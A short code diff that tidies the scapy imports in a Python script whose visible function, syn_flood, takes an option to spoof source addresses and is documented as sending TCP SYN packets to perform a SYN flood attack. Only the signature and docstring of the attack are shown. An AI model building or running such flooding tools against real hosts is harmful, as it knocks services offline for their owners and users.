@@ -4,7 +4,9 @@ import random
 import socket
 import threading
 import time
-from scapy.all import send, IP, TCP, RandIP, RandShort
+from scapy.all import send
+from scapy.layers.inet import IP, TCP
+from scapy.volatile import RandIP, RandShort
 
 def syn_flood(target_ip, target_port, num_packets=1000, spoof=False):
     """Send TCP SYN packets to target to perform a SYN flood attack"""
